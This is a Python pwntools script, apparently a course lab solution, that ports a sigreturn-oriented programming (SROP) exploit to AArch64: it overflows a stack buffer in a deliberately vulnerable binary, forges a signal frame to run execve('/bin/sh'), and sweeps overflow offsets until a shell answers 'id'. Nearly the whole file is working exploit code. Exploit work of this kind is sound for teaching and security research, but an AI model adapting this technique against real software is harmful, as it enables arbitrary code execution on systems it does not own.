#!/usr/bin/env python3
"""AArch64 port of the SROP solve (Chapter 9, Exercise 5).

The technique is identical to solve.py; only three things change:
  1. the rt_sigreturn syscall number is 139 (x86-64 uses 15);
  2. the syscall number lives in x8 (x86-64 uses rax);
  3. the forged frame fields are x0 / pc / sp (x86-64 uses rdi / rip / rsp).

Run under qemu-aarch64 (the lab ships the cross toolchain + qemu-user):

    aarch64-linux-gnu-gcc -fno-stack-protector -no-pie -static \\
        -o vuln_arm64 vuln_arm64.c
    ./solve_arm64.py

AArch64 stores the frame pointer / link register at the *lowest* address of a
function's frame, below its locals, so a linear overflow of vuln()'s buffer
reaches the saved x30 one frame up rather than vuln()'s own. The exact byte
distance depends on how gcc lays out the two frames, so we sweep a small set of
candidate offsets and keep the one that lands the shell — deterministic once
the winning offset is found, and robust across toolchain layout changes.
"""
from pwn import *
import os

context.update(arch='aarch64', os='linux', log_level='error')
elf = context.binary = ELF('./vuln_arm64')

sigreturn_trigger = elf.symbols['sigreturn_trigger']   # mov x8,#139; svc #0
svc_gadget        = elf.symbols['svc_gadget']          # svc #0
binsh             = elf.symbols['binsh']               # "/bin/sh"

# How to launch an AArch64 binary on this host: native, or via qemu-user.
QEMU = os.environ.get('QEMU_AARCH64') or (
    None if context.arch == 'aarch64' and os.uname().machine in ('aarch64', 'arm64')
    else 'qemu-aarch64')
SYSROOT = os.environ.get('QEMU_LD_PREFIX', '/usr/aarch64-linux-gnu')


def argv():
    if QEMU:
        return [QEMU, '-L', SYSROOT, elf.path]
    return [elf.path]


def build_frame():
    frame = SigreturnFrame()            # arch is aarch64 from context
    frame.x8 = constants.SYS_execve     # 221 on aarch64
    frame.x0 = binsh
    frame.x1 = 0
    frame.x2 = 0
    frame.pc = svc_gadget               # execute execve("/bin/sh", 0, 0)
    frame.sp = binsh                    # any mapped address; svc ignores sp
    return bytes(frame)


def attempt(f):
    """Try overflow offset f (position of the saved x29/x30 pair)."""
    frame = build_frame()
    payload  = b'A' * f
    payload += p64(0)                   # fake x29
    payload += p64(sigreturn_trigger)   # fake x30 -> rt_sigreturn trigger
    payload += frame                    # frame lands where sp points after ldp
    payload  = payload.ljust(512, b'\x00')
    try:
        io = process(argv())
        io.send(payload)
        io.sendline(b'echo SROP_OK; id')
        io.recvuntil(b'SROP_OK', timeout=5)
        line = io.recvline(timeout=5).strip().decode(errors='replace')
        io.close()
        return line
    except Exception:
        try:
            io.close()
        except Exception:
            pass
        return None


def main():
    for f in range(16, 160, 8):
        line = attempt(f)
        if line and 'uid=' in line:
            log.success('offset=%d  shell: %s', f, line)
            return 0
    log.failure('no candidate offset produced a shell')
    return 1


if __name__ == '__main__':
    import sys
    sys.exit(main())
